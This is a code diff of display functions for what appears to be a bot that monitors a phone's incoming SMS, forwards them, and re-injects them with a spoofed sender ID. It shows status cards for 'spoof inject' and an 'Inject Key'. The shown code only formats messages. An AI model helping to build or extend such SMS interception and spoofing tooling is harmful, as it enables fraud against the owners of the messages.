@@ -319,8 +319,6 @@ def format_device_set_card(
     device_short = short_device_id(device.name)
     active = get_selected_sim(device, selected_sim)
     active_slot = active.get("slot", 1)
-    active_index = active.get("index", 0)
-    from_number = active.get("number") or device.phone_number or "Unknown"
 
     return (
         "✅ <b>SUCCESS</b>\n\n"
@@ -328,9 +326,7 @@ def format_device_set_card(
         "Device Set!\n\n"
         f"📱 {device_short}\n"
         f"🔋 {get_battery(device)}\n"
-        f"📶 Active SIM: SIM {active_slot} (Index {active_index})\n"
-        f"📞 FROM Number: {from_number}\n"
-        f"{_sim_lines_block(device, numbered=True)}\n\n"
+        f"📶 Active SIM: SIM {active_slot}\n\n"
         "Select SIM Slot for sending SMS:"
         "</pre>"
     )
@@ -367,15 +363,14 @@ def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
 def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
     active = get_selected_sim(device, sim_index)
     slot = active.get("slot", 1)
-    number = active.get("number", "Unknown")
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         f"📱 {short_device_id(device.name)}\n"
         f"📡 Device: {format_device_online(device)}\n"
-        f"{_sim_lines_block(device)}\n"
-        f"✅ FROM SIM {slot}: {number}\n"
-        f"🔋 {get_battery(device)}"
+        f"✅ SIM {slot} selected\n"
+        f"🔋 {get_battery(device)}\n\n"
+        "Tap START Monitoring or STOP:"
         "</pre>"
     )
 
@@ -393,12 +388,10 @@ def format_inject_startup_card(
     to_number: str | None = None,
 ) -> str:
     body = message.replace("<", "").replace(">", "").strip()
-    to_line = f"To: {to_number}\n" if to_number else ""
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
         "⚡ INJECT FORWARDED! [STARTUP]\n"
-        f"{to_line}"
         f"📤 Sender: {sender}\n"
         f"🔐 {body}\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
@@ -484,35 +477,31 @@ def format_monitoring_card(
     profile: MonitorProfile,
     ignored_sms: int = 0,
     test_message: str | None = None,
+    *,
+    startup_test_sent: bool = False,
 ) -> str:
     sim_index = profile.selected_sim_index or 0
     active_sim = get_selected_sim(device, sim_index)
     sim_slot = active_sim.get("slot", 1)
-    sim_number = active_sim.get("number", "Unknown")
-    from app.services import display_phone
-
-    target = display_phone(profile.phone_number) if profile.phone_number else "Not set"
     auto_stop = profile.auto_stop_minutes or 15
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
-    device_phone = _format_sim_number(device.phone_number or sim_number)
+    test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
 
     channel = profile.channel_id or "—"
-    sim_label = _format_sim_number(sim_number)
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
         "Monitoring Started! &lt;/&gt;\n"
-        f"📱 Device: {short_device_id(device.name)} | {device_phone}\n"
+        f"📱 Device: {short_device_id(device.name)}\n"
         f"📡 Device: {format_device_online(device)} (Firebase live)\n"
-        f"📶 FROM SIM: {sim_slot} ({sim_label})\n"
+        f"📶 FROM SIM: {sim_slot}\n"
         f"🔑 Inject Key: {inject_key}\n"
         "📥 Incoming -&gt; spoof inject (same sender ID)\n"
-        f"📞 Real SMS -&gt; {target}\n"
         f"📢 Channel: {channel} (last / addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
         f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
-        f"✅ Test inject OK: {test_msg}"
+        f"{test_line}"
         "</pre>"
     )
 
